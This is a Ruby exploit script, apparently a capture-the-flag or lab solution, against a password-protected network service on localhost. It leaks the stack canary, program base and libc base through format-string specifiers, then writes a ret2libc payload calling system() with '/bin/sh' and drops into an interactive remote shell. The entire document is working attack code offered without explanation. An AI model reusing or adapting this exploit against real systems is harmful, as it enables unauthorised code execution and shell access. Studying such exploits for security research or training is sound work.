require 'socket'

class Exploit
	def initialize(host, port)
		@s = TCPSocket.new(host, port)
	end

	def send_password
		puts @s.readline
		@s.write("letmein\n")
	end

	def get_values
		puts @s.readline
		STDIN.readline
		@s.write("%78$8x%79$8x%82$x".ljust(128, "A"))
		data = @s.readline
		@canary = data[0..7].to_i(16)
		@img_base = data[8..15].to_i(16) - 0xc10
		@libc_base = data[16..23].to_i(16)  - 0x194D3
=begin
		p @canary
		p @img_base.to_s(16)
		p @libc_base.to_s(16)
=end
	end

	def overflow
		puts @s.readline

		null_byte = "%300$c"
		header = ""
		payload = ""
		base = 14
		
		[@canary].pack('<I').each_byte do |x|
			if x == 0
				payload += null_byte
			else
				header += x.chr + "AAA"
				payload += "%#{base}$c"
				base += 1
			end
		end

		payload += "A"*12
		
		system = @libc_base + 0x3f430
		bin_sh = @libc_base + 0x161D98

		[system].pack('<I*').each_byte do |x|
			if x == 0
				payload += null_byte
			else
				header += x.chr + "AAA"
				payload += "%#{base}$c"
				base += 1
			end
		end

		payload += "A"*4

		[bin_sh].pack('<I*').each_byte do |x|
			if x == 0
				payload += null_byte
			else
				header += x.chr + "AAA"
				payload += "%#{base}$c"
				base += 1
			end
		end
	
		remain = 256 - header.length
		p remain
		payload = header + "%#{remain}c" + payload
		p payload.length
		
		@s.write(payload.ljust(128, "A"))
#		@s.write("AAAA%1$x".ljust(128, "A"))
		p @s.readline
	end

	def trigger
		7.times do |x|
			puts @s.readline
			@s.puts("a")
			puts @s.readline
			sleep(0.1)
		end
	end

	def shell
		Thread.new { loop { print @s.read(1) } }
		loop do
			@s.puts(STDIN.readline)
		end
	end
end

e = Exploit.new('localhost', 3129)
e.send_password
e.get_values
e.overflow
e.trigger
e.shell

